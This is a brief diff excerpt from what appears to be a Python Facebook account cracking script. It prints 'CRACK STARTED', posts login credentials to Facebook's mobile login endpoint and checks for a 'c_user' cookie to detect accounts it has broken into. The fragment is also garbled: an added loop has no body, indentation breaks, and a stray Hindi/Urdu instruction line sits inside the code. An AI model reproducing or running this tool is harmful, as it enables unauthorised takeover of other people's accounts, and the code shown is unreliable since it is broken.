@@ -83,6 +83,8 @@ def Main():
 		print('<> TOTAL ID   :  '+tl)
 		print('<> CRACK STARTED....... ')
 		print(50*'━')
+		for guru in user:
+			
 def login():
     os.system("clear")
     print("\033[1;37m")
@@ -131,8 +133,6 @@ def check(uid, pww, ua):
         pass
 
 login()
-
-email or password Laga Lo aur test kro
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
